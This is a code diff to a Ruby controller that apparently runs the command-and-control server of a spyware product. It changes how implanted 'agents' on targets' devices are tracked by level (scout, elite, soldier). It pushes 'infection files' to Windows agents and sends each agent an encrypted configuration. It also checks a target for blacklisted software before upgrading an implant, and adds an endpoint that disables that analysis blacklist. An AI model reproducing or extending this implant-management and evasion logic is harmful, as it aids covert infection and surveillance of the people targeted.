@@ -18,7 +18,7 @@ class AgentController < RESTController
 
     mongoid_query do
       fields = ["name", "desc", "status", "_kind", "path", "type", "ident", "instance", "version", "platform", "uninstalled",
-                "upgradable", "demo", "scout", "good", "stat.last_sync", "stat.last_sync_status", "stat.user", "stat.device",
+                "upgradable", "demo", "level", "good", "stat.last_sync", "stat.last_sync_status", "stat.user", "stat.device",
                 "stat.source", "stat.size", "stat.grid_size"]
 
       fields = fields.inject({}) { |h, f| h[f] = 1; h }
@@ -33,7 +33,7 @@ class AgentController < RESTController
     require_auth_level :tech, :view
 
     mongoid_query do
-      ag = ::Item.where(_id: @params['_id'], deleted: false).in(user_ids: [@session.user[:_id]]).only("name", "desc", "status", "_kind", "stat", "path", "type", "ident", "instance", "platform", "upgradable", "deleted", "uninstalled", "demo", "scout", "good", "version", "counter", "configs")
+      ag = ::Item.where(_id: @params['_id'], deleted: false).in(user_ids: [@session.user[:_id]]).only("name", "desc", "status", "_kind", "stat", "path", "type", "ident", "instance", "platform", "upgradable", "deleted", "uninstalled", "demo", "level", "good", "version", "counter", "configs")
       agent = ag.first
       return not_found if agent.nil?
       ok(agent)
@@ -290,7 +290,7 @@ class AgentController < RESTController
     require_auth_level :server, :tech
     
     demo = (@params['demo'] == 'true') ? true : false
-    scout = (@params['scout'] == 'true') ? true : false
+    level = @params['level'].to_sym
     platform = @params['platform'].downcase
 
     # retro compatibility for older agents (pre 8.0) sending win32, win64, ios, osx
@@ -310,7 +310,7 @@ class AgentController < RESTController
 
     # yes it is, return the status
     unless agent.nil?
-      trace :info, "#{agent[:name]} status is #{agent[:status]} [#{agent[:ident]}:#{agent[:instance]}] (demo: #{demo}, scout: #{scout}, good: #{agent[:good]})"
+      trace :info, "#{agent[:name]} status is #{agent[:status]} [#{agent[:ident]}:#{agent[:instance]}] (demo: #{demo}, level: #{level}, good: #{agent[:good]})"
 
       # if the agent was queued, but now we have a license, use it and set the status to open
       # a demo agent will never be queued
@@ -320,7 +320,7 @@ class AgentController < RESTController
       end
 
       # the agent was a scout but now is upgraded to elite
-      if agent.scout and not scout
+      if agent.level.eql? :scout and level.eql? :elite
         # add the upload files for the first sync
         agent.add_first_time_uploads
 
@@ -328,9 +328,9 @@ class AgentController < RESTController
         agent.add_infection_files if agent.platform == 'windows'
       end
 
-      # update the scout flag
-      if agent.scout != scout
-        agent.scout = scout
+      # update the level
+      if agent.level != level
+        agent.level = level
         agent.save
       end
 
@@ -387,7 +387,7 @@ class AgentController < RESTController
     agent.platform = platform
     agent.instance = @params['instance'].downcase
     agent.demo = demo
-    agent.scout = scout
+    agent.level = level
 
     # default is queued
     agent.status = 'queued'
@@ -404,7 +404,7 @@ class AgentController < RESTController
     agent.save
 
     # the scout must not receive the first uploads
-    unless scout
+    if level.eql? :elite
       # add the upload files for the first sync
       agent.add_first_time_uploads
 
@@ -477,17 +477,13 @@ class AgentController < RESTController
     agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
     return not_found("Agent not found: #{@params['_id']}") if agent.nil?
 
+    # no config for scouts
+    return not_found if agent.level.eql? :scout
+
     # don't send the config to agent too old
-    if agent.platform == 'blackberry' or agent.platform == 'android'
-      if agent.version < 2012013101
-        trace :info, "Agent #{agent.name} is too old (#{agent.version}), new config will be skipped"
-        return not_found
-      end
-    else
-      if agent.version < 2012041601
-        trace :info, "Agent #{agent.name} is too old (#{agent.version}), new config will be skipped"
-        return not_found
-      end
+    if agent.version < 2012041601
+      trace :info, "Agent #{agent.name} is too old (#{agent.version}), new config will be skipped"
+      return not_found
     end
 
     case @request[:method]
@@ -503,8 +499,13 @@ class AgentController < RESTController
         agent.add_infection_files if agent.platform == 'windows'
 
         # encrypt the config for the agent using the confkey
-        enc_config = config.encrypted_config(agent[:confkey])
-        
+        case agent.level
+          when :elite
+            enc_config = config.encrypted_config(agent[:confkey])
+          when :soldier
+            enc_config = config.encrypted_soldier_config(agent[:confkey])
+        end
+
         return ok(enc_config, {content_type: 'binary/octet-stream'})
         
       when 'DELETE'
@@ -612,7 +613,7 @@ class AgentController < RESTController
 
           Audit.log :actor => @session.user[:name], :action => "agent.upgrade", :desc => "Requested an upgrade for agent '#{agent['name']}'"
           trace :info, "Agent #{agent.name} request for upgrade"
-          agent.upgrade!
+          agent.upgrade! @params
           trace :info, "Agent #{agent.name} scheduled for upgrade"
         when 'DELETE'
           agent.upgrade_requests.destroy_all
@@ -625,9 +626,27 @@ class AgentController < RESTController
     end
   end
 
+  def can_upgrade
+    require_auth_level :tech
+
+    mongoid_query do
+      agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
+      # check if the agent can be upgraded and to which kind of agent
+      kind = agent.blacklisted_software?
+      trace :info, "Agent #{agent.name} can be upgraded to: #{kind}"
+      return ok(kind)
+    end
+  end
+
   def blacklist
     require_auth_level :tech
-    ok(File.read(RCS::DB::Config.instance.file('blacklist')))
+    return ok(File.read(RCS::DB::Config.instance.file('blacklist')))
+  end
+
+  def disable_analysis
+    require_auth_level :tech
+    File.write(RCS::DB::Config.instance.file('blacklist_analysis'), "zzz #disabled by tests")
+    return ok
   end
 
   # retrieve the list of download for a given agent
